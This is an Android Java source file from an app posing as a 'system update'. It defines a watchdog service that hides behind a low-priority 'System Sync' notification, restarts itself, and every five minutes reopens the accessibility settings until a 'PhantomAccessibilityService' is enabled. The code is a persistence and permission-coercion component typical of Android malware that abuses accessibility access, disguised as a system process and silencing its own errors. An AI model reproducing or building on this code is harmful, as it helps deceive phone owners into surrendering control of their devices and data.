package com.systemupdate.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

public class AccessibilityWatchdogService extends Service {
    private static final String CHANNEL_ID = "sys_watchdog";
    private static final int NOTIFICATION_ID = 7788;
    private Handler handler = new Handler(Looper.getMainLooper());
    private Runnable check;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        try {
            startForeground(NOTIFICATION_ID, buildNotification());
        } catch (Throwable t) { }

        check = new Runnable() {
            @Override public void run() {
                if (!PhantomAccessibilityService.isRunning()) {
                    try { 
                        startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); 
                    } catch (Throwable t) {}
                }
                handler.postDelayed(this, 300000); // 5 minutes
            }
        };
        handler.postDelayed(check, 10000);
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
        return b.setContentTitle("System Sync").setContentText("Running...").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
    }

    @Override public void onDestroy() { 
        if (handler != null && check != null) handler.removeCallbacks(check); 
        super.onDestroy(); 
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}